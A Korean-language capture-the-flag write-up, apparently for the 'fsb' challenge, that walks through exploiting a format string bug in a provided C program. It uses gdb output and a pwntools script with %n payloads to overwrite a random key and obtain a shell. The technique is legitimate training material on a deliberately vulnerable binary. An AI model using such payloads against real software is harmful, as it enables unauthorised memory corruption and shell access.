---
sort: 7
---

# fsb

home 디렉토리에 fsb.c에 소스코드가 있다.

```c
#include <stdio.h>
#include <alloca.h>
#include <fcntl.h>

unsigned long long key;
char buf[100];
char buf2[100];

int fsb(char** argv, char** envp){
        char* args[]={"/bin/sh", 0};
        int i;

        char*** pargv = &argv;
        char*** penvp = &envp;
        char** arg;
        char* c;
        for(arg=argv;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        for(arg=envp;*arg;arg++) for(c=*arg; *c;c++) *c='\0';
        *pargv=0;
        *penvp=0;

        for(i=0; i<4; i++){
                printf("Give me some format strings(%d)\n", i+1);
                read(0, buf, 100);
                printf(buf);
        }

        printf("Wait a sec...\n");
        sleep(3);

        printf("key : \n");
        read(0, buf2, 100);
        unsigned long long pw = strtoull(buf2, 0, 10);

        if(pw == key){
                printf("Congratz!\n");
                execve(args[0], args, 0);
                return 0;
        }

        printf("Incorrect key \n");
        return 0;
}

int main(int argc, char* argv[], char** envp){

        int fd = open("/dev/urandom", O_RDONLY);
        if( fd==-1 || read(fd, &key, 8) != 8 ){
                printf("Error, tell admin\n");
                return 0;
        }
        close(fd);

        alloca(0x12345 & key);

        fsb(argv, envp); // exploit this format string bug!
        return 0;
}
```

`/dev/urandom`을 이용해 key를 random값으로 채운 후, pw와 비교해서 똑같으면 shell을 실행시켜주는 코드이다.<br>
random값을 우리가 때려맞출 수 없기 때문에 pw를 입력하기 전에 fsb를 사용할 수 있게 해줬다.<br>
fsb로 key를 원하는 값으로 바꾼 후에 pw에 바꾼 값을 넣으면 될 것 같다.<br><br>
key길이가 8byte이기 때문에 `%hn`을 이용해 2byte씩 4번 변조하면 될 것으로 여겨진다.<br>

key는 전역변수이기 때문에 data영역에 저장이 되어있을 것이고, aslr이 적용되지 않았기 때문에 고정된 주소값을 가지게 된다.<br>
main함수에 `read(fd, &key, 8)`부분을 확인하면 된다.

```
(gdb) x/gx 0x804a060
0x804a060 <key>:        0x0000000000000000
```

key의 주소는 `0x804a060`이다.<br>
fsb를 이용해서 key값을 잘 조작해서 풀면 될 것 같다.

```
   0x08048676 <+322>:   call   0x8048460 <strtoull@plt>
   0x0804867b <+327>:   mov    %eax,%edx
   0x0804867d <+329>:   sar    $0x1f,%edx
   0x08048680 <+332>:   mov    %eax,-0x30(%ebp)
   0x08048683 <+335>:   mov    %edx,-0x2c(%ebp)
```
그런데 웃긴 사실은, pw에 입력값이 온전하게 저장되는 것이 아니다.<br>
edx에 strtoull의 결과값의 상위 4byte가 들어가고 eax에 하위 4byte가 들어가는데, edx가 eax로 덮어씌워지고나선, 31번 arithmetic right shift를 한다. 즉, edx는 eax의 MSB로 채워진다는 소리이다.<br>
따라서 소스코드와는 다르게 동작하는 부분이 존재하게 되고, 결론적으로 key값의 상위 4byte는 하위 4byte의 MSB로 채워져야 한다는 소리이다.<br>
그래서 상위 4byte에는 0을 넣었고, 하위 4byte에는 대충 MSB가 0이 되도록 했다.<br>
`char*** pargv = &argv; char*** penvp = &envp;` 부분을 이용해 fsb의 함수 인자가 저장되는 위치를 알 수 있기 때문에 해당하는 부분에 key의 상위 4byte주소와 하위 4byte주소를 넣은 뒤, key를 공격할 것이다.<br><br>

```
Give me some format strings(1)
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
804a100 64 0 0 0 0 0 0 8048870 0 0 ffbab008 ffbacfe9 ffb9acb0 ffb9acb4 0 0 ffbaaf08 8048791 0 0 0 0 0 0

(gdb) x/4wx $ebp
0xffb9aca8:     0xffbaaf08      0x08048791      0x00000000      0x00000000
```

stack memory가 어떻게 생겼는지 알아보기위해 대충 %x 엄청 넣고 돌려봤다.<br>
ebp부분도 저렇게 출력시켜보니, 0x08048791이 return address인 것을 알 수 있다.<br>
그리고 return address의 주소는 0xffb9acac인 것을 알 수 있다.<br>
따라서 pargv와 penvp에는 0xffb9acb0과 0xffb9acb4가 저장되어있을 것이다.<br>
따라서 이것을 잘 활용하여 key를 변조하면 될 듯 하다.<br>

```python
from pwn import *

p = process('/home/fsb/fsb')
p.recvline()

# 0x804a060을 fsb함수의 첫번째 argument자리에 입력하기 위해 0x804a060 byte를 출력한 후 pargv값을 이용
p.sendline('%134520928x%14$n')
p.recvline()
p.recvline()
# 0x804a064를 fsb함수의 두번째 argument자리에 입력하기 위해 0x804a064 byte를 출력한 후 penvp값을 이용
p.sendline('%134520932x%15$n')
p.recvline()
p.recvline()
# key 상위 4byte에 0 넣기
p.sendline('%21$n')
p.recvline()
p.recvline()
# key 하위 4byte에 8 넣기
p.sendline('%8x%20$n')
p.recvline()
p.recvline()
p.sendline('8')

p.interactive()
```

왠진 모르겠는데, key 상위 4byte에 0넣는 것과 key 하위 4byte에 8넣는 것의 순서를 바꾸면 segmentation fault가 뜬다.... 이 부분에 대해선 나중에 시간날 때 더 살펴봐야겠다..


```tip
## 알게 된 점

fsb
```